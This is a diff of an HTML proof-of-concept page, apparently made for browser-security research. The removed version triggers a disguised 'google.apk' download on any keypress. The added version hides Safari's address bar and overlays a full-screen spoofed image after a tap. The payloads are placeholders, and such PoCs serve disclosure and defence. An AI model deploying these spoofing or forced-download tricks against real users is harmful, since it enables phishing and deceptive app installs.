@@ -1,42 +1,82 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Download & Fullscreen on Keypress</title>
+<meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+
+<title>iOS Safari Spoof PoC</title>
+
+<style>
+html, body {
+    margin: 0;
+    padding: 0;
+    height: 100%;
+    font-family: -apple-system, BlinkMacSystemFont, Arial, sans-serif;
+}
+
+/* Front page */
+#front {
+    height: 200vh; /* needed to trigger scroll & hide address bar */
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+
+.card {
+    background: #fff;
+    padding: 40px;
+    border-radius: 14px;
+    box-shadow: 0 0 15px rgba(0,0,0,.2);
+    text-align: center;
+    width: 80vw;
+}
+
+.card img {
+    height: 120px;
+}
+
+/* Spoofed page */
+#spoofed {
+    display: none;
+    position: fixed;
+    inset: 0;
+    z-index: 9999;
+}
+
+#spoofed img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+}
+</style>
 </head>
+
 <body>
-  <center><h2>POC by Chigorin!</h2></center>
 
-  <script>
-    // Listen to any keydown
-    window.addEventListener('keydown', function(e) {
-      // open the download
-      openWin();
-      // request fullscreen
-      //goFullScreen();
-    });
+<!-- Front -->
+<div id="front" onclick="runSpoof()">
+    <div class="card">
+        <img src="https://play-lh.googleusercontent.com/KwUBNPbMTk9jDXYS2AeX3illtVRTkrKVh5xR1Mg4WHd0CG2tV4mrh1z3kXi5z_warlk=w240-h480-rw">
+        <h2>Tap anywhere to continue</h2>
+        <p>Scroll will hide Safari UI</p>
+    </div>
+</div>
 
-    // Download helper
-    function Puf(uri, name) {
-      const link = document.createElement("a");
-      link.href = uri;
-      link.download = name;
-      document.body.appendChild(link);
-      link.click();
-      document.body.removeChild(link);
-    }
+<!-- Spoofed -->
+<div id="spoofed">
+    <img src="spoof.png">
+</div>
 
-    // Kick off your “APK” download
-    function openWin() {
-      Puf(
-        "data://google.com/application/x-msdownload;base64,ZXN0dGVzdGVzdHRlc3Q=",
-        "google.apk"
-      );
-    }
+<script>
+function runSpoof() {
+    document.getElementById("front").style.display = "none";
+    document.getElementById("spoofed").style.display = "block";
 
-  </script>
-  
+    // Force scroll to hide address bar
+    window.scrollTo(0, 1);
+}
+</script>
 
-  
 </body>
 </html>
